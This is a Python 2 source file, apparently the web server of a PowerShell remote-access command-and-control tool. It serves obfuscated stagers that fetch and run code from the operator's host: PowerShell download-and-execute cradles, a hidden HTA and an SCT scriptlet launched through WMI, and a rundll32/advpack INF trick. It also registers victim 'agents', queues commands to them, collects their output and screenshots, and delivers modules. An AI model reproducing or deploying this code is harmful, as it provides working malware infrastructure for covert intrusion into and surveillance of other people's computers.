# Embedded file name: core\webserver.py
from lib import web
from core import config
from core.color import bcolors
import time
import base64
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

class MyApplication(web.application):

    def run(self, port = 8080, host = '0.0.0.0', *middleware):
        func = self.wsgifunc(*middleware)
        return web.httpserver.runsimple(func, (host, port))


urls = ('/', 'index', '/get', 'payload', '/getc', 'payloadc', '/hjf', 'payloadjf', '/hjfs', 'payloadjfs', '/sct', 'sct', '/hta', 'mshta', '/info/(.*)', 'info', '/dl/(.*)', 'download', '/up/(.*)', 'upload', '/img/(.*)', 'image', '/cm/(.*)', 'command', '/re/(.*)', 'result', '/md/(.*)', 'modules')

def toB52(st):
    value = 0
    encoded = []
    while len(st) % 2 > 0:
        st = st + chr(0)

    for i in range(len(st)):
        value = value * 256 + ord(st[i])
        if (i + 1) % 2 == 0:
            for j in range(3):
                encoded.append(chr(40 + value % 52))
                value //= 52

    encoded.reverse()
    return ''.join(encoded)


class index:

    def GET(self):
        return 'Hello.!!!!'


class payload:

    def GET(self):
        ip = web.ctx.ip
        p_out = '[+] Powershell PAYLOAD Send (%s)' % ip
        print bcolors.OKGREEN + p_out + bcolors.ENDC
        return config.PAYLOAD()


class payloadc:

    def GET(self):
        ip = web.ctx.ip
        p_out = '[+] Powershell Encoded PAYLOAD Send (%s)' % ip
        print bcolors.OKGREEN + p_out + bcolors.ENDC
        payload = config.PAYLOAD()
        return toB52(payload)


class payloadjf:

    def GET(self):
        ip = web.ctx.ip
        p_out = '[+] Powershell JOB + File PAYLOAD Send (%s)' % ip
        print bcolors.OKGREEN + p_out + bcolors.ENDC
        payload = '$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString(\'http://{ip}:{port}/getc\');set-content -path c:\\programdata\\a.zip -value $S;set-content -path c:\\programdata\\b.ps1 -value ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\'{payload}\')));Start-Process powershell -ArgumentList "-exec bypass -w 1 -file c:\\programdata\\b.ps1" -WindowStyle Hidden;start-sleep 10;del c:\\programdata\\a.zip;del c:\\programdata\\b.ps1;'
        commandF = "$s=(get-content C:\\\\ProgramData\\\\a.zip);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join('',$d));"
        payload = payload.replace('{ip}', config.IP).replace('{port}', config.PORT)
        commandF = commandF.encode('base64').replace('\n', '')
        payload = payload.replace('{payload}', commandF)
        payload = payload.encode('base64').replace('\n', '')
        payload = "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('%s')))}" % payload
        return payload


class payloadjfs:

    def GET(self):
        ip = web.ctx.ip
        p_out = '[+] Powershell JOB + File +SCT PAYLOAD Send (%s)' % ip
        print bcolors.OKGREEN + p_out + bcolors.ENDC
        payload = '$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString(\'http://{ip}:{port}/getc\');set-content -path c:\\programdata\\a.zip -value $S;$S=$V.DownloadString(\'http://{ip}:{port}/sct\');set-content -path c:\\programdata\\sct.zip -value $S;set-content -path c:\\programdata\\sct.ps1 -value ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\'{payload}\')));set-content -path c:\\programdata\\sct.ini -value ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\'W3ZlcnNpb25dDQpTaWduYXR1cmU9JGNoaWNhZ28kDQoNCltFeGNlbF0NClVuUmVnaXN0ZXJPQ1hzPUV2ZW50TWFuYWdlcg0KDQpbRXZlbnRNYW5hZ2VyXQ0KJTExJVxzY3JvYmouZGxsLE5JLGM6L3Byb2dyYW1kYXRhL3NjdC56aXANCg0KW1N0cmluZ3NdDQpBcHBBY3QgPSAiU09GVFdBUkVcTWljcm9zb2Z0XENvbm5lY3Rpb24gTWFuYWdlciINClNlcnZpY2VOYW1lPSIgIg0KU2hvcnRTdmNOYW1lPSIgIg==\')));start-process rundll32.exe -ArgumentList "advpack.dll,LaunchINFSection C:\\ProgramData\\sct.ini,Excel,1," -WindowStyle Hidden;start-sleep 30;del c:\\programdata\\a.zip;del c:\\programdata\\sct.ps1;del c:\\programdata\\sct.zip;del c:\\programdata\\sct.ini;'
        commandF = "$s=(get-content C:\\\\ProgramData\\\\a.zip);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join('',$d));"
        payload = payload.replace('{ip}', config.IP).replace('{port}', config.PORT)
        commandF = commandF.encode('base64').replace('\n', '')
        payload = payload.replace('{payload}', commandF)
        payload = payload.encode('base64').replace('\n', '')
        payload = "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('%s')))}" % payload
        return payload


class info:

    def POST(self, id):
        data = web.data()
        if config.AGENTS.get(id) == None and data != None:
            data = data.split('**')
            ip = web.ctx.ip
            data.insert(0, ip)
            data.insert(0, config.COUNT)
            config.set_count(config.COUNT + 1)
            p_out = '[+] New Agent Connected(%d): %s - %s\\%s' % (config.COUNT - 1,
             ip,
             data[6],
             data[7])
            print bcolors.OKGREEN + p_out + bcolors.ENDC
            config.AGENTS.update({id: data})
            config.COMMAND.update({id: []})
            config.TIME.update({id: time.time()})
        return 'OK'


class download:

    def GET(self, name):
        try:
            name = name.decode('base64').replace('\n', '')
            fp = open('file/' + name, 'rb')
            file = fp.read()
            file = file.encode('base64').replace('\n', '')
            p_out = '[+] download file %s' % name
            print bcolors.OKGREEN + p_out + bcolors.ENDC
            return file
        except Exception as e:
            print '[-] Download: ' + str(e)
            return ''


class mshta:

    def GET(self):
        ip = web.ctx.ip
        p_out = '[+] New Agent Request HTA PAYLOAD (%s)' % ip
        print bcolors.OKGREEN + p_out + bcolors.ENDC
        code = '\n<html>\n<head>\n<script language="JScript">\nwindow.resizeTo(1, 1);\nwindow.moveTo(-2000, -2000);\nwindow.blur();\n\ntry\n{\n    window.onfocus = function() { window.blur(); }\n    window.onerror = function(sMsg, sUrl, sLine) { return false; }\n}\ncatch (e){}\n\nfunction replaceAll(find, replace, str) \n{\n  while( str.indexOf(find) > -1)\n  {\n    str = str.replace(find, replace);\n  }\n  return str;\n}\nfunction bas( string )\n    {\n        string = replaceAll(\']\',\'=\',string);\n        string = replaceAll(\'[\',\'a\',string);\n        string = replaceAll(\',\',\'b\',string);\n        string = replaceAll(\'@\',\'D\',string);\n        string = replaceAll(\'-\',\'x\',string);\n        string = replaceAll(\'~\',\'N\',string);\n        string = replaceAll(\'*\',\'E\',string);\n        string = replaceAll(\'%\',\'C\',string);\n        string = replaceAll(\'$\',\'H\',string);\n        string = replaceAll(\'!\',\'G\',string);\n        string = replaceAll(\'{\',\'K\',string);\n        string = replaceAll(\'}\',\'O\',string);\n        var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";\n        var result     = \'\';\n\n        var i = 0;\n        do {\n            var b1 = characters.indexOf( string.charAt(i++) );\n            var b2 = characters.indexOf( string.charAt(i++) );\n            var b3 = characters.indexOf( string.charAt(i++) );\n            var b4 = characters.indexOf( string.charAt(i++) );\n\n            var a = ( ( b1 & 0x3F ) << 2 ) | ( ( b2 >> 4 ) & 0x3 );\n            var b = ( ( b2 & 0xF  ) << 4 ) | ( ( b3 >> 2 ) & 0xF );\n            var c = ( ( b3 & 0x3  ) << 6 ) | ( b4 & 0x3F );\n\n            result += String.fromCharCode(a) + (b?String.fromCharCode(b):\'\') + (c?String.fromCharCode(c):\'\');\n\n        } while( i < string.length );\n\n        return result;\n    }\n\nvar es = \'{code}\';\neval(bas(es));\n</script>\n<hta:application caption="no" showInTaskBar="no" windowState="minimize" navigable="no" scroll="no" />\n</head>\n<body>\n</body>\n</html> \t\n\n'
        js = '\n\t\nvar cm="powershell -exec bypass -w 1 -c $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX($V.downloadstring(\'http://{ip}:{port}/get\'));";\nvar w32ps= GetObject(\'winmgmts:\').Get(\'Win32_ProcessStartup\');\nw32ps.SpawnInstance_();\nw32ps.ShowWindow=0;\nvar rtrnCode=GetObject(\'winmgmts:\').Get(\'Win32_Process\').Create(cm,\'c:\\\\\',w32ps,null);\n'
        js = js.replace('{ip}', config.IP).replace('{port}', config.PORT)
        js = js.encode('base64').replace('\n', '')
        re = [[']', '='],
         ['[', 'a'],
         [',', 'b'],
         ['@', 'D'],
         ['-', 'x'],
         ['~', 'N'],
         ['*', 'E'],
         ['%', 'C'],
         ['$', 'H'],
         ['!', 'G'],
         ['{', 'K'],
         ['}', 'O']]
        for i in re:
            js = js.replace(i[1], i[0])

        return code.replace('{code}', js)


class sct:

    def GET(self):
        ip = web.ctx.ip
        p_out = '[+] New Agent Request SCT PAYLOAD (%s)' % ip
        print bcolors.OKGREEN + p_out + bcolors.ENDC
        code = '<?xml version="1.0" encoding="utf-8"?>\n<package>\n  <component>\n    <registration progid="y">\n      <script language="JScript"><![CDATA[\n\t\tfunction replaceAll(find, replace, str) \n\t\t{\n\t\t  while( str.indexOf(find) > -1)\n\t\t  {\n\t\t    str = str.replace(find, replace);\n\t\t  }\n\t\t  return str;\n\t\t}\n\t\tfunction bas( string )\n\t\t    {\n\t\t        string = replaceAll(\']\',\'=\',string);\n\t\t        string = replaceAll(\'[\',\'a\',string);\n\t\t        string = replaceAll(\',\',\'b\',string);\n\t\t        string = replaceAll(\'@\',\'D\',string);\n\t\t        string = replaceAll(\'-\',\'x\',string);\n\t\t        string = replaceAll(\'~\',\'N\',string);\n\t\t        string = replaceAll(\'*\',\'E\',string);\n\t\t        string = replaceAll(\'%\',\'C\',string);\n\t\t        string = replaceAll(\'$\',\'H\',string);\n\t\t        string = replaceAll(\'!\',\'G\',string);\n\t\t        string = replaceAll(\'{\',\'K\',string);\n\t\t        string = replaceAll(\'}\',\'O\',string);\n\t\t        var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";\n\t\t        var result     = \'\';\n\n\t\t        var i = 0;\n\t\t        do {\n\t\t            var b1 = characters.indexOf( string.charAt(i++) );\n\t\t            var b2 = characters.indexOf( string.charAt(i++) );\n\t\t            var b3 = characters.indexOf( string.charAt(i++) );\n\t\t            var b4 = characters.indexOf( string.charAt(i++) );\n\n\t\t            var a = ( ( b1 & 0x3F ) << 2 ) | ( ( b2 >> 4 ) & 0x3 );\n\t\t            var b = ( ( b2 & 0xF  ) << 4 ) | ( ( b3 >> 2 ) & 0xF );\n\t\t            var c = ( ( b3 & 0x3  ) << 6 ) | ( b4 & 0x3F );\n\n\t\t            result += String.fromCharCode(a) + (b?String.fromCharCode(b):\'\') + (c?String.fromCharCode(c):\'\');\n\n\t\t        } while( i < string.length );\n\n\t\t        return result;\n\t\t    }\n\n\t\tvar es = \'{code}\';\n\t\teval(bas(es));\n\t  ]]></script>\n    </registration>\n  </component>\n</package>\n'
        js = '\n\t\nvar cm="powershell -exec bypass -w 1 -file c:\\\\programdata\\\\sct.ps1";\nvar w32ps= GetObject(\'winmgmts:\').Get(\'Win32_ProcessStartup\');\nw32ps.SpawnInstance_();\nw32ps.ShowWindow=0;\nvar rtrnCode=GetObject(\'winmgmts:\').Get(\'Win32_Process\').Create(cm,\'c:\\\\\',w32ps,null);\n'
        js = js.replace('{ip}', config.IP).replace('{port}', config.PORT)
        js = js.encode('base64').replace('\n', '')
        re = [[']', '='],
         ['[', 'a'],
         [',', 'b'],
         ['@', 'D'],
         ['-', 'x'],
         ['~', 'N'],
         ['*', 'E'],
         ['%', 'C'],
         ['$', 'H'],
         ['!', 'G'],
         ['{', 'K'],
         ['}', 'O']]
        for i in re:
            js = js.replace(i[1], i[0])

        return code.replace('{code}', js)


class upload:

    def GET(self):
        return 'Hello.!!!!'


class image:

    def POST(self, id):
        data = web.data()
        if config.AGENTS.get(id) != None and data != None:
            data = data.decode('base64')
            fp = open('images/%s.jpg' % id, 'wb')
            fp.write(data)
            fp.close()
            p_out = '[+] Agent (%d) - %s send image(%s bytes)' % (config.AGENTS[id][0], config.AGENTS[id][7], len(data))
            print bcolors.OKGREEN + p_out + bcolors.ENDC
        return 'OK'


class command:

    def GET(self, id):
        if config.AGENTS.get(id) != None:
            config.TIME[id] = time.time()
        if config.AGENTS.get(id) != None and len(config.COMMAND.get(id)) > 0:
            cmd = config.COMMAND[id].pop(0)
            print bcolors.OKGREEN + '[~] ' + id + ':' + cmd + bcolors.ENDC
            return cmd
        elif config.AGENTS.get(id) == None:
            print bcolors.OKGREEN + '[~] ' + id + ':Register' + bcolors.ENDC
            return 'REGISTER'
        else:
            return ''


class result:

    def POST(self, id):
        data = web.data()
        if config.AGENTS.get(id) != None and data != None:
            data = data.decode('base64')
            p_out = '[+] Agent (%d) - %s send Result' % (config.AGENTS[id][0], config.AGENTS[id][7])
            print bcolors.OKGREEN + p_out + bcolors.ENDC
            print data
        else:
            return 'REGISTER'
        return


class modules:

    def POST(self, id):
        data = web.data()
        if config.AGENTS.get(id) != None and data != None:
            p_out = '[+] New Agent Request Module %s (%s - %s)' % (data, config.AGENTS[id][0], config.AGENTS[id][7])
            print bcolors.OKGREEN + p_out + bcolors.ENDC
            try:
                fpm = open('Modules/' + data, 'r')
                module = fpm.read()
                return module
                fpm.close()
            except Exception as e:
                print e
                return ''

        return 'OK'


def main():
    try:
        web.config.log_toprint = True
        app = MyApplication(urls, globals())
        app.run(port=int(config.PORT))
    except Exception as e:
        print '[-] ERROR(webserver->main): %s' % str(e)
